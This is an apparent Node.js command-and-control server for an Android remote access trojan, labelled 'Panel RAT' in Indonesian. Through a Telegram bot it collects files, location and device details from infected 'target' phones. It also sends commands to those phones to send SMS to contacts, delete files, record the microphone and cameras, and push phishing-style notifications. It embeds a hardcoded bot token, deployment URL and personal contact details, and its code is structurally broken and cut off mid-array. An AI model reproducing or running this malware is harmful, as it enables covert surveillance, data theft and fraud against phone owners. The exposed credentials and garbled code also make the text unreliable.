const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7536436084:AAGpx7eJQsCwfggjwGUxWazyj-KXQWWXfvo'
const id = '7953841468'
const address = 'https://telebot-production-45ec.up.railway.app/'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''
// Endpoint utama: halaman saat server diakses
app.get('/', function (req, res) {
    res.send('<h1 align="center">✅ 𝙎𝙚𝙧𝙫𝙚𝙧 𝙗𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙙𝙞𝙟𝙖𝙡𝙖𝙣𝙠𝙖𝙣</h1>')
})

// Endpoint untuk menerima file yang diunggah
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙋𝙚𝙨𝙖𝙣 𝙙𝙖𝙧𝙞 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

// Endpoint untuk menerima teks dari perangkat
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙋𝙚𝙨𝙖𝙣 𝙙𝙖𝙧𝙞 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

// Endpoint untuk menerima lokasi dari perangkat
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙠𝙖𝙨𝙞 𝙙𝙖𝙧𝙞 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
appBot.sendMessage(id,
    `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙗𝙖𝙧𝙪 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n` +
    `• ᴍᴏᴅᴇʟ ᴘᴇʀᴀɴɢᴋᴀᴛ : <b>${model}</b>\n` +
    `• ᴛɪɴɢᴋᴀᴛ ʙᴀᴛᴇʀᴀɪ : <b>${battery}</b>\n` +
    `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
    `• ᴋᴇᴛᴇʀᴀɴɢᴀɴ ʟᴀʏᴀʀ : <b>${brightness}</b>\n` +
    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
    {parse_mode: "HTML"}
)

ws.on('close', function () {
    appBot.sendMessage(id,
        `°• 𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙥𝙪𝙩𝙪𝙨 𝙙𝙖𝙧𝙞 𝙨𝙚𝙧𝙫𝙚𝙧\n\n` +
        `• ᴍᴏᴅᴇʟ ᴘᴇʀᴀɴɢᴋᴀᴛ : <b>${model}</b>\n` +
        `• ᴛɪɴɢᴋᴀᴛ ʙᴀᴛᴇʀᴀɪ : <b>${battery}</b>\n` +
        `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
        `• ᴋᴇᴛᴇʀᴀɴɢᴀɴ ʟᴀʏᴀʀ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    appClients.delete(ws.uuid)
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (message.reply_to_message) {

        // Jika membalas permintaan nomor tujuan SMS
        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙩𝙪𝙟𝙪𝙖𝙣')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 𝙞𝙣𝙞\n\n' +
                '• ʜᴀʀᴀᴘ ʙᴇʜᴀᴛɪ-ʜᴀᴛɪ, ᴘᴇꜱᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴊᴜᴍʟᴀʜ ᴋᴀʀᴀᴋᴛᴇʀ ᴍᴇʟᴇʙɪʜɪ ʙᴀᴛᴀꜱ',
                { reply_markup: { force_reply: true } }
            )
        }

        // Jika membalas pesan permintaan isi pesan SMS
        if (message.reply_to_message.text.includes('°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                        resize_keyboard: true
                    }
                }
            )
        }

        // Jika membalas permintaan kirim ke semua kontak
        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                        resize_keyboard: true
                    }
                }
            )
        }

        // Jika membalas permintaan path file untuk download
        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙤𝙠𝙖𝙨𝙞 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙪𝙣𝙙𝙪𝙝')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                        resize_keyboard: true
                    }
                }
            )
        }
    }
});
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙤𝙠𝙖𝙨𝙞 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙝𝙖𝙥𝙪𝙨')) {
    const path = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`delete_file:${path}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙢𝙞𝙠𝙧𝙤𝙛𝙤𝙣 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
    const duration = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`microphone:${duration}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                'resize_keyboard': true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙠𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
    const duration = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`rec_camera_main:${duration}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                'resize_keyboard': true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙠𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
    const duration = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`rec_camera_selfie:${duration}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                'resize_keyboard': true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙩𝙖𝙢𝙥𝙞𝙡𝙠𝙖𝙣 𝙙𝙞 𝙡𝙖𝙮𝙖𝙧 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙖𝙧𝙜𝙚𝙩')) {
    const toastMessage = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`toast:${toastMessage}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                'resize_keyboard': true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞')) {
    const notificationMessage = message.text
    currentTitle = notificationMessage
    appBot.sendMessage(id,
        '°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙗𝙪𝙠𝙖 𝙠𝙚𝙩𝙞𝙠𝙖 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞 𝙙𝙞𝙠𝙡𝙞𝙠\n\n' +
        '• ꜱᴀᴀᴛ ᴛᴀʀɢᴇᴛ ᴍᴇɴɢᴋʟɪᴋ ɴᴏᴛɪꜰɪᴋᴀꜱɪ, ᴛᴀᴜᴛᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴅɪʙᴜᴋᴀ',
        { reply_markup: { force_reply: true } }
    )
}

if (message.reply_to_message.text.includes('°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣...')) {
    const link = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`show_notification:${currentTitle}/${link}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙥𝙪𝙩𝙖𝙧')) {
    const audioLink = message.text
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
            ws.send(`play_audio:${audioLink}`)
        }
    });
    currentUuid = ''
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (id == chatId) {
    if (message.text == '/start') {
        appBot.sendMessage(id,
            '°• 𝙎𝙚𝙡𝙖𝙢𝙖𝙩 𝙙𝙖𝙩𝙖𝙣𝙜 𝙙𝙞 𝙋𝙖𝙣𝙚𝙡 𝙍𝘼𝙏\n\n' +
            '• ᴊɪᴋᴀ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴛᴇʀᴘᴀꜱᴀɴɢ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ, ᴛᴜɴɢɢᴜ ꜱᴀᴍᴘᴀɪ ᴛᴇʀʜᴜʙᴜɴ\n\n' +
            '• ꜱᴀᴀᴛ ᴀɴᴅᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴘᴇꜱᴀɴ "ᴛᴇʀʜᴜʙᴜɴɢ", ʙᴇʀᴀʀᴛɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ꜱᴜᴅᴀʜ ꜱɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴘᴇʀɪɴᴛᴀʜ\n\n' +
            '• ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴘᴇʀɪɴᴛᴀʜ, ᴘɪʟɪʜ ᴘᴇʀᴀɴɢᴋᴀᴛ ʏᴀɴɢ ᴅɪɪɴɢɪɴᴋᴀɴ, ʟᴀʟᴜ ᴘɪʟɪʜ ᴘᴇʀɪɴᴛᴀʜ ᴅᴀʀɪ ᴅᴀꜰᴛᴀʀ ʏᴀɴɢ ᴀᴅᴀ\n\n' +
            '• ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛᴇʀᴊᴇʀᴀᴛ ᴅɪ ᴛᴇɴɢᴀʜ ʙᴏᴛ, ᴋɪʀɪᴍ ᴘᴇʀɪɴᴛᴀʜ /start ᴜɴᴛᴜᴋ ᴍᴜʟᴀɪ ᴅᴀʀɪ ᴜʟᴀɴɢ\n\n' +
            '<b>• 𝙄𝙣𝙛𝙤 : choerullanam@gmail.com | 081318574216</b>',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
}
if (message.text == '𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜') {
    if (appClients.size == 0) {
        appBot.sendMessage(id,
            '°• 𝙏𝙞𝙙𝙖𝙠 𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n' +
            '• ᴘᴀꜱᴛɪᴋᴀɴ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴅɪɪɴꜱᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ'
        )
    } else {
        let text = '°• 𝘿𝙖𝙛𝙩𝙖𝙧 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜 :\n\n'
        appClients.forEach(function (value, key, map) {
            text += `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴇʀᴀɪ : <b>${value.battery}</b>\n` +
                    `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${value.version}</b>\n` +
                    `• ᴋᴇᴄᴇʀᴀʜᴀɴ ʟᴀʏᴀʀ : <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
        })
        appBot.sendMessage(id, text, {parse_mode: "HTML"})
    }
}
if (message.text == '𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝') {
    if (appClients.size == 0) {
        appBot.sendMessage(id,
            '°• 𝙏𝙞𝙙𝙖𝙠 𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n' +
            '• ᴘᴀꜱᴛɪᴋᴀɴ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴅɪɪɴꜱᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ'
        )
    } else {
        const deviceListKeyboard = []
        appClients.forEach(function (value, key, map) {
            deviceListKeyboard.push([{
                text: value.model,
                callback_data: 'device:' + key
            }])
        })
        appBot.sendMessage(id, '°• 𝙋𝙞𝙡𝙞𝙝 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙪𝙣𝙩𝙪𝙠 𝙙𝙞𝙗𝙚𝙧𝙞 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝', {
            "reply_markup": {
                "inline_keyboard": deviceListKeyboard,
            },
        })
    }
}
} else {
    appBot.sendMessage(id, '°• 𝘼𝙠𝙨𝙚𝙨 𝙙𝙞𝙩𝙤𝙡𝙖𝙠')
}
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙋𝙞𝙡𝙞𝙝 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝 𝙪𝙣𝙩𝙪𝙠 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙡𝙞𝙠𝙖𝙨𝙞', callback_data: `apps:${uuid}`},
                        {text: '𝙄𝙣𝙛𝙤 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝘼𝙢𝙗𝙞𝙡 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝙃𝙖𝙥𝙪𝙨 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙠𝙧𝙤𝙛𝙤𝙣', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙆𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖', callback_data: `camera_main:${uuid}`},
                        {text: '𝙆𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙠𝙖𝙨𝙞', callback_data: `location:${uuid}`},
                        {text: '𝙋𝙚𝙨𝙖𝙣 𝙩𝙖𝙢𝙥𝙞𝙡', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙖𝙣𝙜𝙜𝙞𝙡𝙖𝙣', callback_data: `calls:${uuid}`},
                        {text: '𝘽𝙪𝙠𝙪 𝙖𝙡𝙖𝙢𝙖𝙩', callback_data: `contacts:${uuid}`}
                    ],
                    [
